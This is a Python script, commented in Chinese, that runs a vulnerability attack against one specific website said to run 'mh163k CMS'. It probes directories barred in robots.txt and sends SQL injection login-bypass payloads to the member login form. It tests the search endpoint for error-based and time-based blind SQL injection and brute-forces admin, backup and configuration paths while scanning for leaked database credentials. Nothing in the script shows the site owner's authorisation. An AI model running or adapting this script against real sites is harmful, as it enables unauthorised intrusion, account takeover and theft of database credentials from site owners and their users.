import subprocess
import time
import urllib.parse

TARGET = "https://www.malaqin.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

def curl_get(path, timeout=12):
    url = TARGET + path
    cmd = ["curl", "-s", "-k", "-A", UA, "--compressed", "--max-time", str(timeout), url]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
        return result.stdout if result.stdout else ""
    except:
        return ""

def curl_post(path, data, timeout=12):
    url = TARGET + path
    cmd = ["curl", "-s", "-k", "-A", UA, "--compressed", "--max-time", str(timeout),
           "-X", "POST", "-d", data, url]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+5)
        return result.stdout if result.stdout else ""
    except:
        return ""

def main():
    print("=" * 70)
    print("  玛拉沁信息网 - mh163k CMS 专项漏洞验证")
    print("=" * 70)

    # ============================================================
    print("\n[1] /help/ 目录探测 (robots.txt中禁止)")
    print("-" * 60)
    
    help_paths = [
        "/help/",
        "/help/index.php",
        "/help/index.html",
        "/help/config.php",
        "/help/db.php",
        "/help/test.php",
        "/help/readme.txt",
        "/help/install.php",
    ]
    
    body_404 = curl_get("/nonexist_xyz_999")
    size_404 = len(body_404)
    
    for path in help_paths:
        body = curl_get(path)
        blen = len(body)
        if blen > 0 and abs(blen - size_404) > 100:
            print(f"  !! [{blen}B]  {path}")
            if blen < 500:
                print(f"         内容: {body[:300]}")
        else:
            print(f"     [{blen}B]  {path}")
        time.sleep(0.15)

    # ============================================================
    print("\n[2] 登录表单 POST SQL注入")
    print("-" * 60)
    
    # 先获取登录页面基线
    login_page = curl_get("/member/login")
    print(f"  登录页面大小: {len(login_page)}B")
    
    # 尝试登录 - 基线请求
    post_data_normal = "username=testuser&password=testpass"
    body_normal = curl_post("/member/login", post_data_normal)
    print(f"  正常登录响应: {len(body_normal)}B")
    
    # 检查响应中的关键词
    if "密码" in body_normal or "错误" in body_normal or "失败" in body_normal:
        print(f"  -> 包含错误提示(密码错误等)")
    if "验证码" in body_normal:
        print(f"  -> 需要验证码")
    
    # SQL注入 - 登录绕过
    sqli_login_tests = [
        ("username=admin'+OR+'1'='1'--&password=anything", "admin' OR 1=1-- 绕过"),
        ("username=admin'+OR+'1'='1'/*&password=anything", "admin' OR 1=1/* 绕过"),
        ("username=admin'--&password=anything", "admin'-- 绕过"),
        ("username=admin'+OR+1=1--&password=x", "admin' OR 1=1-- (无引号)"),
        ("username=admin%27+OR+%271%27%3D%271&password=x", "URL编码 OR 1=1"),
        ("username=admin'+UNION+SELECT+1,2,3,4,5,6,7--&password=x", "UNION注入"),
    ]
    
    for data, label in sqli_login_tests:
        body = curl_post("/member/login", data)
        blen = len(body)
        
        # 检查是否登录成功
        success_markers = ["退出", "注销", "登录成功", "欢迎", "个人中心", "我的首页"]
        error_markers = ["SQL", "mysql", "error", "错误", "失败", "密码错误", "用户不存在"]
        
        found_success = [m for m in success_markers if m in body]
        found_error = [m for m in error_markers if m.lower() in body.lower()]
        
        if found_success:
            print(f"  !! [{blen}B]  {label} - 可能登录成功!")
            print(f"         成功标记: {found_success}")
        elif found_error:
            print(f"  ** [{blen}B]  {label}")
            print(f"         错误标记: {found_error}")
            # 检查SQL错误
            sql_errs = ["SQL syntax", "mysql", "SQLSTATE", "Warning:"]
            for e in sql_errs:
                if e.lower() in body.lower():
                    idx = body.lower().find(e.lower())
                    print(f"         SQL错误: {body[max(0,idx-30):idx+100]}")
        else:
            # 对比正常响应大小
            diff = blen - len(body_normal)
            if abs(diff) > 200:
                print(f"  ** [{blen}B] 差异:{diff:+d}  {label}")
            else:
                print(f"     [{blen}B] 差异:{diff:+d}  {label}")
        time.sleep(0.3)

    # ============================================================
    print("\n[3] 搜索接口 /common/search SQL注入")
    print("-" * 60)
    
    # 基线搜索
    body_search = curl_get("/common/search?search=test123&searchtype=1")
    print(f"  搜索基线: {len(body_search)}B")
    
    # 检查是否反射
    if "test123" in body_search:
        idx = body_search.find("test123")
        context = body_search[max(0,idx-50):idx+80]
        print(f"  !! 搜索词被反射!")
        print(f"    上下文: ...{context}...")
    
    # SQL注入
    search_sqli = [
        ("/common/search?search=test'+OR+'1'='1&searchtype=1", "OR 1=1"),
        ("/common/search?search=test'+AND+'1'='2&searchtype=1", "AND 1=2"),
        ("/common/search?search=test'+UNION+SELECT+1,2,3--&searchtype=1", "UNION"),
        ("/common/search?search=test%27+OR+%271%27%3D%271&searchtype=1", "URL编码OR"),
        ("/common/search?search=test'+AND+SLEEP(3)--&searchtype=1", "SLEEP(3)"),
    ]
    
    for path, label in search_sqli:
        start = time.time()
        body = curl_get(path, timeout=15)
        elapsed = time.time() - start
        blen = len(body)
        
        sql_errs = ["SQL syntax", "mysql", "SQLSTATE", "Warning: mysql"]
        found_sql = [e for e in sql_errs if e.lower() in body.lower()]
        
        if found_sql:
            print(f"  !! [{blen}B] {elapsed:.1f}s  {label} - SQL错误!")
            for e in found_sql:
                idx = body.lower().find(e.lower())
                print(f"         {body[max(0,idx-30):idx+100]}")
        elif "SLEEP" in label and elapsed > 2.5:
            print(f"  !! [{blen}B] {elapsed:.1f}s  {label} - 可能时间盲注!")
        else:
            print(f"     [{blen}B] {elapsed:.1f}s  {label}")
        time.sleep(0.3)

    # ============================================================
    print("\n[4] mh163k CMS 已知漏洞路径")
    print("-" * 60)
    
    mh163k_paths = [
        # 后台路径
        "/admin/login.php",
        "/admin/index.php",
        "/admin/admin.php",
        "/admin/manage.php",
        "/admin/upload.php",
        "/admin/database.php",
        "/admin/backup.php",
        "/admin/config.php",
        "/admin/set.php",
        "/admin/setting.php",
        # 常见配置/数据路径
        "/data/config.php",
        "/data/db.php",
        "/data/database.php",
        "/data/config.inc.php",
        "/data/sql.inc.php",
        "/data/conn.php",
        "/data/common.inc.php",
        "/data/common.php",
        # 缓存路径
        "/cache/config.php",
        "/cache/db.php",
        "/cache/data.php",
        # 上传路径
        "/upload/file.php",
        "/upload/upload.php",
        "/UploadFile/file.php",
        "/UploadFile/upload.php",
        # include路径
        "/include/common.php",
        "/include/config.php",
        "/include/db.php",
        "/include/conn.php",
        "/include/mysql.php",
        # 其他
        "/install.php",
        "/install/index.php",
        "/upgrade.php",
        "/test.php",
        "/phpinfo.php",
        "/info.php",
        "/debug.php",
        "/conn.php",
        "/db.php",
        "/config.php",
        "/config.inc.php",
        "/database.php",
        "/mysql.php",
        "/common.php",
        "/global.php",
        "/init.php",
    ]
    
    for path in mh163k_paths:
        body = curl_get(path)
        blen = len(body)
        if blen > 0 and abs(blen - size_404) > 100:
            print(f"  !! [{blen}B]  {path}")
            # 检查是否是PHP文件内容
            php_markers = ["<?php", "mysql", "password", "DB_HOST", "DB_USER", "DB_PASS", "conn", "include"]
            found = [m for m in php_markers if m.lower() in body.lower()[:500]]
            if found:
                print(f"         PHP标记: {found}")
                print(f"         内容: {body[:200]}")
        time.sleep(0.15)

    # ============================================================
    print("\n[5] 注册功能 - 批量注册/注入测试")
    print("-" * 60)
    
    reg_page = curl_get("/member/register")
    print(f"  注册页面大小: {len(reg_page)}B")
    
    # 检查注册表单
    import re
    forms = re.findall(r'<form[^>]*>.*?</form>', reg_page, re.S | re.I)
    for i, form in enumerate(forms):
        action = re.findall(r'action=["\']([^"\']+)["\']', form, re.I)
        inputs = re.findall(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', form, re.I)
        if inputs:
            print(f"  表单{i+1}: action={action}, 字段={inputs}")

    # ============================================================
    print("\n[6] 其他API/接口探测")
    print("-" * 60)
    
    api_paths = [
        "/api/login.php",
        "/api/register.php",
        "/api/search.php",
        "/api/upload.php",
        "/api/user.php",
        "/api/info.php",
        "/api/article.php",
        "/api/list.php",
        "/api/data.php",
        "/api/config.php",
        "/common/login.php",
        "/common/register.php",
        "/common/upload.php",
        "/common/search.php",
        "/common/config.php",
    ]
    
    for path in api_paths:
        body = curl_get(path)
        blen = len(body)
        if blen > 0 and abs(blen - size_404) > 100:
            print(f"  !! [{blen}B]  {path}")
            if blen < 500:
                print(f"         内容: {body[:200]}")
        time.sleep(0.15)

    print("\n验证完成。")

if __name__ == "__main__":
    main()
